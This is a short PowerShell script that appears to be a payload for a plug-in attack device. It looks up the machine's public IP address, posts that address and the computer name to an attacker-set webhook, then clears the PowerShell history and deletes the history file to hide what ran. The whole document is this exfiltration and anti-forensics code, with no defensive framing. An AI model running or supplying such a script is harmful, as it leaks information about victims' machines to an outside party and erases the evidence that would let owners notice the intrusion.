$hookurl = ""
$public_ip = $(Invoke-WebRequest -Uri "http://icanhazip.com" | Select-Object -ExpandProperty "Content")

$json_to_send = @{"username" = "$env:COMPUTERNAME" ; "content" = "Public IP: $public_ip"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $json_to_send

[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); Remove-item (Get-PSReadlineOption).HistorySavePath;